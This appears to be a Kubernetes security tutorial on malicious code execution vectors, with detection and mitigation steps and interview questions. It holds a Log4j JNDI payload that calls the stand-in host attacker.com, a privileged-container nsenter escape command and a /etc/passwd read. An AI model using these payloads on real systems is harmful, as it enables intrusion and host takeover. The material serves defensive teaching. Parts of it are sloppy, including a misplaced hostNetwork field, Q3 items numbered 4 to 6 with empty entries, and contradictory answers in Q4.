# 01.07 - Malicious Code Execution

## 1️⃣ What This Topic Is

Malicious Code Execution examines how attackers execute unauthorized code in Kubernetes containers and clusters, understanding code injection vectors, detection techniques, and mitigation strategies.

**What this means:**
- Malicious code execution = running unauthorized commands/code
- Attacker wants to execute arbitrary code in containers
- Multiple execution vectors in Kubernetes
- Understanding execution helps design secure containers

**The Key Concepts:**

1. **Execution Types**
   - Container code execution (initial compromise)
   - Supply chain execution (malicious images/dependencies)
   - Runtime execution (container exploitation)
   - Host code execution (container escape)

2. **Execution Vectors**
   - Vulnerable container images (CVEs)
   - Vulnerable dependencies (npm, pip, etc.)
   - Container runtime vulnerabilities (escape to host)
   - Application vulnerabilities (RCE in apps)
   - Configuration errors (privileged containers)

**Why this matters:**
- Code execution is initial compromise vector
- Leads to data theft and cluster compromise
- Enables further attacks (privilege escalation, persistence)
- Code execution is foundation of cyber attacks

---

## 2️⃣ What Problem It Solves

### Problem 1: Untrusted Container Images

**Without understanding code execution:**
- Deploy untrusted container images
- Images may contain malicious code or backdoors
- Images may have vulnerabilities (CVEs)
- Code execution occurs immediately on deployment

**With understanding code execution:**
- Scan images for vulnerabilities
- Sign and verify images
- Use minimal, updated base images
- Prevent code execution from untrusted sources

### Problem 2: Vulnerable Dependencies

**Without understanding code execution:**
- Use vulnerable dependencies in application code
- Build process pulls vulnerable packages
- Dependencies may have malicious code or CVEs
- Code execution occurs when application runs

**With understanding code execution:**
- Scan dependencies for vulnerabilities
- Use SBOM (Software Bill of Materials)
- Use private package registries
- Pin dependency versions

### Problem 3: Container Runtime Vulnerabilities

**Without understanding code execution:**
- Use vulnerable container runtime
- Runtime may have code execution vulnerabilities
- Attacker can escape container to host
- Code execution on host = cluster compromise

**With understanding code execution:**
- Update container runtime regularly
- Use secure runtime configurations
- Monitor for container escape attempts
- Implement security contexts

### Real-World Impact

**Example: Tesla Kubernetes Breach (2018)**
- **Vulnerability**: Unmonitored Kubelet API with code execution
- **Root cause**: Kubelet API exposed without authentication
- **Code execution issue**: Attacker executed code via Kubelet API
- **Impact**: Attacker deployed miners across cluster
- **Lesson**: Secure Kubelet API, monitor for code execution

**Example: Uber Data Breach (2016)**
- **Vulnerability**: Compromised credentials allowed code execution
- **Root cause**: No proper authentication
- **Code execution issue**: Attacker executed code in cluster
- **Impact**: Attacker accessed 57 million customer records
- **Lesson**: Implement strong authentication and monitoring

**Example: Apache Struts RCE (2017)**
- **Vulnerability**: Remote code execution in Struts
- **Root cause**: Unpatched Struts dependency
- **Code execution issue**: Attacker executed code via Struts
- **Impact**: Equifax breach (147 million records)
- **Lesson**: Patch dependencies, scan for vulnerabilities

## 4️⃣ How It Works (Conceptual)

### Malicious Code Execution Vectors

**1. Container Image Vulnerabilities**
- **Purpose**: Exploit vulnerabilities in container images
- **Attacker Use**: Scan for CVEs, exploit to execute code
- **Detection Challenge**: Images appear legitimate
- **Example**: Exploit CVE in base image to gain shell access

**Attack Flow:**
```
Attacker scans for CVEs → Exploits vulnerable base image → Executes code in container → Attacker gains shell access → Malicious code executes
```

**Detection:**
- Scan images for vulnerabilities
- Check image hashes
- Use image signing and verification

**Mitigation:**
- Use minimal, updated base images
- Scan images before deployment
- Use image signing and verification
- Use private image registry

**Example**:
```bash
# Attacker exploits vulnerable image
kubectl run vulnerable-pod --image=vulnerable:latest -- sh -c "whoami && cat /etc/passwd"
```

**2. Supply Chain Attacks**
- **Purpose**: Plant malicious code in build process
- **Attacker Use**: Compromise CI/CD pipeline, inject malicious code
- **Detection Challenge**: Malicious code is built legitimately
- **Example**: Typosquatting (malicious package with legitimate name)

**Attack Flow:**
```
Attacker compromises CI/CD → Attacker injects malicious code → Malicious code built into image → Image deployed to production → Malicious code executes
```

**Detection:**
- Use SBOM (Software Bill of Materials)
- Verify package hashes
- Scan images for malicious code
- Use private image registry

**Mitigation:**
- Scan images for vulnerabilities
- Use image signing and verification
- Use private package registries
- Secure build pipeline

**Example**:
```json
// package.json with malicious dependency
{
  "name": "myapp",
  "dependencies": {
    "express": "^4.18.0",
    "malicious-package": "1.0.0"  // Typosquatting attack
  }
}
```

**3. Container Runtime Vulnerabilities**
- **Purpose**: Exploit container runtime to execute code on host
- **Attacker Use**: Exploit CVEs in containerd, Docker, etc.
- **Detection Challenge**: Runtime appears legitimate
- **Example**: Container escape via vulnerable runtime

**Attack Flow:**
```
Attacker exploits runtime CVE → Container escape to host → Attacker executes code on host → Cluster compromised
```

**Detection:**
- Monitor for container escape attempts
- Monitor for host process execution
- Use Falco for runtime security

**Mitigation:**
- Update container runtime regularly
- Use secure runtime configurations
- Use security contexts (non-root, read-only)
- Implement seccomp/AppArmor profiles

**Example**:
```bash
# Container escape via privileged container
kubectl run privileged-pod --image=alpine --privileged -- sh -c "nsenter -t 1 -m -u root bash"
```

**4. Application Vulnerabilities**
- **Purpose**: Exploit application vulnerabilities (RCE)
- **Attacker Use**: Exploit CVEs in application code
- **Detection Challenge**: Application appears legitimate
- **Example**: Exploit Log4j vulnerability to execute code

**Attack Flow:**
```
Attacker exploits application CVE → Remote code execution in application → Attacker gains application access → Malicious code executes
```

**Detection:**
- Scan applications for vulnerabilities
- Monitor for unusual application behavior
- Use WAF (Web Application Firewall)

**Mitigation:**
- Scan applications for vulnerabilities
- Patch dependencies regularly
- Use security libraries
- Implement input validation

**Example**:
```bash
# Attacker exploits Log4j RCE
curl -X POST -H "X-Api-Version: 1.0" -H "Content-Type: application/json" \
  -d '{"name":"${jndi:ldap://attacker.com/a}"}' \
  http://webserver.cluster.com/api/v1/users
```

**5. Configuration Errors**
- **Purpose**: Exploit misconfigurations to execute code
- **Attacker Use**: Exploit privileged containers, hostPath mounts
- **Detection Challenge**: Configuration appears to be legitimate
- **Example**: Use privileged container to execute code on host

**Attack Flow:**
```
Attacker deploys privileged container → Container has host access → Attacker executes code on host → Cluster compromised
```

**Detection:**
- Monitor for privileged containers
- Monitor for hostPath mounts
- Monitor for container escape attempts

**Mitigation:**
- Use security contexts (non-root, no privileges)
- Use seccomp/AppArmor profiles
- Implement pod security policies
- Regular security reviews

**Example**:
```yaml
# Privileged container (dangerous)
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: app
    image: nginx:1.25-alpine
    securityContext:
      privileged: true  # DANGEROUS
      hostNetwork: true  # DANGEROUS
```

### Malicious Code Execution Detection Techniques

**1. Image Scanning**
- Scan images for vulnerabilities
- Scan for malicious code
- Check image hashes
- Use image signing and verification

**2. Dependency Scanning**
- Scan dependencies for vulnerabilities
- Check dependency hashes
- Use SBOM (Software Bill of Materials)
- Use private package registries

**3. Runtime Monitoring**
- Monitor for malicious processes
- Monitor for unusual system calls
- Use Falco for runtime security
- Monitor for container escape attempts

**4. Behavioral Monitoring**
- Monitor for unusual behavior
- Detect anomalies in process execution
- Detect anomalies in file system access
- Detect anomalies in network activity

**5. Audit Log Analysis**
- Monitor audit logs for code execution
- Detect unusual API calls
- Detect unusual object creation
- Detect unusual resource access

### **Common Mistakes in Code Execution Detection/Mitigation**

❌ **Mistake 1**: Not scanning images
- Reality: Images may have vulnerabilities or malicious code
- Fix: Scan all images before deployment

❌ **Mistake 2**: Not scanning dependencies
- Reality: Dependencies may have vulnerabilities or malicious code
- Fix: Scan all dependencies, use SBOM

❌ **Mistake 3**: Running as root
- Reality: Root access in containers is dangerous
- Fix: Always use runAsNonRoot: true

❌ **Mistake 4**: Not using security contexts
- Reality: Without security contexts, containers are vulnerable
- Fix: Use security contexts, seccomp profiles, AppArmor

**Task 4: Detect Malicious Code Execution**

```bash
echo "=== Detecting Malicious Code Execution ==="

# 1. Check for privileged containers
echo "1. Checking for Privileged Containers:"
kubectl get pods --all-namespaces -o jsonpath='{.items[*].spec.containers[*].securityContext.privileged}' | grep -i true
if [ "$(kubectl get pods --all-namespaces -o jsonpath='{.items[*].spec.containers[*].securityContext.privileged}' | grep -i true)" != "" ]; then
  echo "   ALERT: Privileged containers detected!"
  echo "   Investigation: Check if privilege escalation possible"
fi

# 2. Check for hostPath mounts
echo ""
echo "2. Checking for HostPath Mounts:"
kubectl get pods --all-namespaces -o jsonpath='{.items[*].spec.volumes[*].hostPath}'
if [ "$(kubectl get pods --all-namespaces -o jsonpath='{.items[*].spec.volumes[*].hostPath}')" != "" ]; then
  echo "   ALERT: HostPath mounts detected!"
  echo "   Investigation: Check if container escape possible"
fi

# 3. Check for suspicious processes
echo ""
echo "3. Checking for Suspicious Processes:"
for pod in $(kubectl get pods --all-namespaces -o name); do
  processes=$(kubectl exec -it $pod -- ps aux 2>/dev/null | grep -v "sh\|nginx\|node\|python" || true)
  if [ "$processes" != "" ]; then
    echo "   ALERT: Suspicious processes in pod $pod"
    echo "   Processes: $processes"
  fi
done

# 4. Check for unusual resource usage
echo ""
echo "4. Checking for Unusual Resource Usage:"
for pod in $(kubectl get pods --all-namespaces -o name); do
  cpu=$(kubectl top pod $pod 2>/dev/null | grep -m1 "CPU" | awk '{print $2}')
  echo "Pod: $pod, CPU: $cpu"
  if [ "${cpu%}" -gt 50 ]; then
    echo "   ALERT: High CPU usage in pod $pod: ${cpu}%"
    echo "   Investigation: Check for crypto mining or malicious code execution"
  fi
done
```

### **Common Interview Questions**

**Q1: What are common code execution vectors in Kubernetes?**
**Good Answer**: Common code execution vectors in Kubernetes include:

1. **Container Image Vulnerabilities**: 
   - Exploit CVEs in base images
   - Use outdated or vulnerable images
   - Attacker gains shell access in container

2. **Supply Chain Attacks**: 
   - Typosquatting (malicious packages)
   - Compromised CI/CD pipeline
   - Malicious code built into images
   - Attacker gains code execution when image runs

3. **Container Runtime Vulnerabilities**: 
   - Exploit CVEs in containerd, Docker, etc.
   - Container escape to host
   - Attacker executes code on host
   - Cluster compromised

4. **Application Vulnerabilities**: 
   - Exploit RCE vulnerabilities in applications
   - Log4j, Struts, etc.
   - Attacker executes code in application
   - Application compromised

5. **Configuration Errors**: 
   - Privileged containers
   - HostPath mounts
   - Attacker executes code on host
   - Cluster compromised

Each vector allows attacker to execute unauthorized code.

**Q2: How do you detect malicious code execution in Kubernetes?**
**Good Answer**: Code execution detection in Kubernetes includes:

1. **Image Scanning**: 
   - Scan images for vulnerabilities (Trivy, Clair)
   - Scan for malicious code
   - Check image hashes
   - Use image signing and verification

2. **Dependency Scanning**: 
   - Scan dependencies for vulnerabilities
   - Check dependency hashes
   - Use SBOM (Software Bill of Materials)
   - Use private package registries

3. **Runtime Monitoring**: 
   - Monitor for suspicious processes (Falco)
   - Monitor for unusual system calls
   - Monitor for container escape attempts
   - Monitor for code execution on host

4. **Behavioral Monitoring**: 
   - Monitor for unusual behavior
   - Detect anomalies in process execution
   - Detect anomalies in file system access
   - Detect anomalies in network activity

Detection tools: Trivy, Clair, Falco, Prometheus, etc.

**Q3: How do you mitigate code execution in Kubernetes?**
**Good Answer**: Code execution mitigation in Kubernetes includes:

1. **Security Contexts**: 
   - Run as non-root user
   - Drop all capabilities
   - Use read-only filesystem
   - Implement seccomp/AppArmor profiles
   - Prevent privilege escalation

2. **Pod Security Policies**: 
   - Enforce security configurations
   - Require non-root users
   - Drop capabilities

3. **Image Security**: 
   - Scan images for vulnerabilities

4. **Dependency Security**:

6. **Admission Controllers**:

   - Validate security contexts
   - Implement image scanning policies

Combined approach provides defense in depth against code execution.

**Q4: What's the most dangerous code execution vector in Kubernetes?**
**Good Answer**: The most dangerous code execution vectors are:

1. **Container Runtime Vulnerabilities (Container Escape)**: Because it's most dangerous
   - Attacker can execute code on host
   - Cluster compromised if host is control plane
   - Enables lateral movement and persistence

2. **Supply Chain Attacks**: Because they're hardest to detect
   - Malicious code built legitimately
   - Backdoors are built into images
   - Hard to scan for malicious code

3. **Application Vulnerabilities (RCE)**: Because they're common
   - Log4j, Struts, etc. are common
   - Exploits widely known
   - Can lead to data breach

Container escape (runtime) is most dangerous because it compromises host. Supply chain is most dangerous because it's hardest to detect. Application RCE is most dangerous because it's common.

**Q5: How do Pod Security Policies help prevent code execution?**
**Good Answer**: PSPs help prevent code execution by:

1. **Enforcing Security Configurations**: 
   - Require non-root users
   - Prevent privileged containers
   - Require dropping capabilities
   - Restrict volume types (no hostPath)

2. **Preventing Privilege Escalation**: 
   - Set allowPrivilegeEscalation to false
   - Prevent privilege escalation within container
   - Prevent container escape attempts

3. **Restricting Access**: 
   - Restrict host access
   - Restrict network access
   - Restrict file system access
   - Prevent lateral movement

4. **Validating Images**: 
   - Validate images before deployment
   - Implement image scanning policies
   - Reject vulnerable images
   - Prevent malicious code execution

5. **Monitoring and Alerting**: 
   - Alert on PSP violations
   - Detect insecure configurations
   - Enable automated response
   - Prevent deployment of insecure pods

PSPs enforce security standards and prevent insecure configurations that enable code execution.

## 📝 **Summary**

Malicious Code Execution examines how attackers execute unauthorized code in Kubernetes containers and clusters. Common execution vectors include container image vulnerabilities, supply chain attacks, container runtime vulnerabilities, application vulnerabilities, and configuration errors. Detection requires image scanning, dependency scanning, runtime monitoring, and behavioral monitoring. Mitigation requires security contexts, PSPs, image/dependency scanning, and admission controllers.

**Key Takeaways:**
1. Code execution is initial compromise: Attackers need to execute code
2. Multiple vectors exist: Images, dependencies, runtime, applications, configurations
3. Detection is challenging: Code execution looks like legitimate activity
4. Security contexts prevent escape: Non-root prevents host access
5. PSPs enforce policies: Require security configurations
6. Monitoring is critical: Detects unusual processes and resource usage
7. Vulnerability scanning is essential: Detects CVEs in images and dependencies
